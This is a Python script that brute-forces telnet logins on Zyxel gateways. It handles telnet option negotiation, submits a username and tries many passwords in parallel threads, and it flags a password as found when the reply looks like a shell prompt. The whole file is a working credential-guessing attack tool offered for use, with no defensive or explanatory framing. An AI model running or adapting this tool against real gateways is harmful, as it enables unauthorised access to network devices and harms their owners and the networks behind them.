"""
Telnet brute force tool for Zyxel gateway - improved detection
"""
import socket
import time
import concurrent.futures

def telnet_brute(target, port, username, passwords, max_workers=10, timeout=5):
    """
    Try multiple passwords for a telnet login.
    Returns the first successful password found.
    """
    password_list = [p.strip() for p in passwords.split(',') if p.strip()]
    
    def try_password(password):
        s = socket.socket()
        s.settimeout(int(timeout))
        try:
            s.connect((target, int(port)))
            # Read until login prompt
            data = b''
            s.settimeout(2)
            try:
                while True:
                    c = s.recv(1)
                    if not c: break
                    data += c
                    if c == b'\xff':
                        c2 = s.recv(1)
                        data += c2
                        if c2 in (b'\xfd', b'\xfb'):
                            cmd = s.recv(1)
                            data += cmd
                            if c2 == b'\xfd':
                                s.send(b'\xff\xfc' + cmd)
                            elif c2 == b'\xfb':
                                s.send(b'\xff\xfe' + cmd)
                    if b'login:' in data:
                        break
            except socket.timeout:
                pass
            
            s.send((username + '\n').encode())
            
            # Read until password prompt
            data2 = b''
            s.settimeout(2)
            try:
                while True:
                    c = s.recv(1)
                    if not c: break
                    data2 += c
                    if c == b'\xff':
                        c2 = s.recv(1)
                        data2 += c2
                        if c2 in (b'\xfd', b'\xfb'):
                            cmd = s.recv(1)
                            data2 += cmd
                            if c2 == b'\xfd':
                                s.send(b'\xff\xfc' + cmd)
                            elif c2 == b'\xfb':
                                s.send(b'\xff\xfe' + cmd)
                    if b'Password:' in data2:
                        break
            except socket.timeout:
                pass
            
            s.send((password + '\n').encode())
            
            # Wait for full response
            time.sleep(1)
            resp = b''
            s.settimeout(2)
            try:
                while True:
                    d = s.recv(4096)
                    if not d: break
                    resp += d
            except socket.timeout:
                pass
            
            s.close()
            
            full_resp = data + data2 + resp
            
            if b'Login incorrect' in resp or b'login:' in resp:
                return password, False, ''
            elif resp.strip():
                # Got some response that's not an error - could be shell
                return password, True, resp.decode('utf-8', errors='replace')[:500]
            return password, False, ''
        except Exception as e:
            try:
                s.close()
            except:
                pass
            return password, 'error', str(e)
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=int(max_workers)) as executor:
        futures = {executor.submit(try_password, pwd): pwd for pwd in password_list}
        for future in concurrent.futures.as_completed(futures):
            pwd, success, resp = future.result()
            if success == True:
                return {'found': True, 'username': username, 'password': pwd, 'response': resp}
    
    return {'found': False, 'username': username, 'message': 'No valid password found'}
